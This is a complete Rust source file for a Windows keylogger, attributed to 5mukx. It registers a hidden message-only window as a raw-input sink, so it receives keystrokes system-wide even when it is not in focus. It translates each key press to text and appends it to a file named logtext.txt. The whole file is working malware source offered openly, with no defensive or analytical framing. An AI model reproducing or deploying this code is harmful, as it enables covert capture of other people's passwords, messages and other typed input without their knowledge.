/*
 * Keylogger using GetRawInputData()
 * By 5mukx 
 *
*/

use std::ptr::null_mut;

use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::{shared::{
    minwindef::{LPARAM, LRESULT, MAKELONG, UINT, WORD, WPARAM}, 
    ntdef::HANDLE, windef::HWND}, 
    um::{fileapi::{CreateFileA, SetFilePointer, WriteFile, OPEN_ALWAYS}, 
    handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, 
    heapapi::{GetProcessHeap, HeapAlloc, HeapFree}, 
    winbase::FILE_END, 
    winnt::{FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, GENERIC_WRITE}, 
    winuser::{DefWindowProcA, DestroyWindow, GetKeyNameTextA, GetKeyState, GetKeyboardState, GetRawInputData, MapVirtualKeyA, MessageBoxA, PostQuitMessage, RegisterRawInputDevices, ToAscii, RAWINPUT, RAWINPUTDEVICE, RAWINPUTHEADER, RIDEV_INPUTSINK, RID_INPUT, RIM_TYPEKEYBOARD, VK_BACK, VK_CAPITAL, VK_NUMLOCK, VK_RETURN, VK_SCROLL, VK_SHIFT, WM_CREATE, WM_DESTROY, WM_INPUT, WM_KEYDOWN
            }
        }
    };
use winapi::um::winuser::{CreateWindowExA, DispatchMessageA, GetMessageA, RegisterClassExA, TranslateMessage, HRAWINPUT, HWND_MESSAGE, MB_ICONEXCLAMATION, MB_OK, MSG, WNDCLASSEXA};

const CLASS_NAME: &str = "klgClass\0";

unsafe fn log_key(h_log: HANDLE, vkey: i32) -> i32 {
    let mut dw_written = 0;
    let mut lp_keyboard = [0u8; 256];
    let mut sz_key = [0i8; 32];
    let mut buf = [0i8; 32];
    let mut w_key: WORD = 0;

    // Convert virtual-key to ascii
    GetKeyState(VK_CAPITAL);
    GetKeyState(VK_SCROLL);
    GetKeyState(VK_NUMLOCK);
    GetKeyboardState(lp_keyboard.as_mut_ptr());

    let len = match vkey {
        VK_BACK => {
            buf[0] = '[' as i8;
            buf[1] = 'B' as i8;
            buf[2] = 'P' as i8;
            buf[3] = ']' as i8;
            4
        }
        VK_RETURN => {
            buf[0] = '\r' as i8;
            buf[1] = '\n' as i8;
            2
        }
        VK_SHIFT => 0,
        _ => {
            let ascii = ToAscii(
                vkey.try_into().unwrap(),
                MapVirtualKeyA(vkey.try_into().unwrap(), 0),
                lp_keyboard.as_mut_ptr(),
                &mut w_key,
                0
            );

            let getkeynametexta = GetKeyNameTextA(
                MAKELONG(0, MapVirtualKeyA(vkey.try_into().unwrap(), 0) as WORD),
                sz_key.as_mut_ptr(),
                32
            );

            if ascii == 1 {
                buf[0] = w_key as i8;
                1
            } else if getkeynametexta > 0 {
                let key_name = std::ffi::CStr::from_ptr(sz_key.as_ptr()).to_str().unwrap_or("");
                let len = key_name.len();
                for (i, &c) in key_name.as_bytes().iter().enumerate() {
                    buf[i] = c as i8;
                }
                buf[len] = '\0' as i8;
                len as i32
            } else {
                0
            }
        }
    };

    if len > 0 {
        let writefile = WriteFile(h_log, buf.as_ptr() as *const _, len as u32, &mut dw_written, null_mut());
        if writefile == 0 {
            return -1;
        }
    }

    0
}

unsafe extern "system" fn wnd_proc(hwnd: HWND, msg: UINT, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    static mut H_LOG: HANDLE = null_mut();
    let mut dw_size = 0;
    let rid = RAWINPUTDEVICE {
        usUsagePage: 0x01,
        usUsage: 0x06,
        dwFlags: RIDEV_INPUTSINK,
        hwndTarget: hwnd,
    };

    match msg {
        WM_CREATE => {
            if RegisterRawInputDevices(&rid, 1, std::mem::size_of::<RAWINPUTDEVICE>() as UINT) == 0 {
                MessageBoxA(null_mut(), "Registering raw input device failed!\0".as_ptr() as *const i8, "Error!\0".as_ptr() as *const i8,  MB_ICONEXCLAMATION | MB_OK);
                return -1;
            }

            H_LOG = CreateFileA(
                "logtext.txt\0".as_ptr() as *const i8, 
                GENERIC_WRITE,
                FILE_SHARE_READ,
                null_mut(),
                OPEN_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                null_mut(),
            );

            if H_LOG == INVALID_HANDLE_VALUE {
                MessageBoxA(null_mut(), "Creating log.txt failed!\0".as_ptr() as *const i8, "Error\0".as_ptr() as *const i8, MB_ICONEXCLAMATION | MB_OK);
                return -1;
            }

            SetFilePointer(H_LOG, 0, null_mut(), FILE_END);
        }
        WM_INPUT => {
            GetRawInputData(l_param as HRAWINPUT, RID_INPUT, null_mut(), &mut dw_size, std::mem::size_of::<RAWINPUTHEADER>() as UINT);

            let buffer = HeapAlloc(GetProcessHeap(), 0, dw_size as usize) as *mut RAWINPUT;

            if GetRawInputData(l_param as HRAWINPUT, RID_INPUT, buffer as *mut _, &mut dw_size, std::mem::size_of::<RAWINPUTHEADER>() as UINT) > 0 {
                if (*buffer).header.dwType == RIM_TYPEKEYBOARD && (*buffer).data.keyboard().Message == WM_KEYDOWN {
                    if log_key(H_LOG, ((*buffer).data.keyboard().VKey as u32).try_into().unwrap()) == -1 {
                        DestroyWindow(hwnd);
                    }
                }
            }

            HeapFree(GetProcessHeap(), 0, buffer as *mut _);
        }
        WM_DESTROY => {
            if H_LOG != INVALID_HANDLE_VALUE {
                CloseHandle(H_LOG);
            }
            PostQuitMessage(0);
        }
        _ => return DefWindowProcA(hwnd, msg, w_param, l_param),
    }

    0
}

// main function on next stream ..!
fn main(){
    unsafe{
        let h_instance = GetModuleHandleA(null_mut());
        let mut wc:WNDCLASSEXA = std::mem::zeroed();

        wc.cbSize = std::mem::size_of::<WNDCLASSEXA>() as UINT;
        wc.lpfnWndProc = Some(wnd_proc);
        wc.hInstance = h_instance;
        wc.lpszClassName = CLASS_NAME.as_ptr() as *const i8;

        if RegisterClassExA(&wc) == 0{
            MessageBoxA(null_mut(), "Window Registration Failed!".as_ptr() as *const i8, "Error!\0".as_ptr() as *const i8, MB_ICONEXCLAMATION | MB_OK);
            return;
        }
        
        let hwnd = CreateWindowExA(
            0,
            CLASS_NAME.as_ptr() as *const i8, 
            null_mut(), 
            0,
            0, 0, 0, 0, 
            HWND_MESSAGE,
            null_mut(), 
            h_instance,
            null_mut()
        );

        if hwnd.is_null(){
            MessageBoxA(null_mut(),
            "Window Creation Failed!\0".as_ptr() as *const i8,
            "Error\0".as_ptr() as *const i8,
            MB_ICONEXCLAMATION | MB_OK
            );
            return;
        }

        let mut msg: MSG = std::mem::zeroed();
        while GetMessageA(
            &mut msg,
            null_mut(),
            0, 0
        ) > 0 {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        } 
    }
}
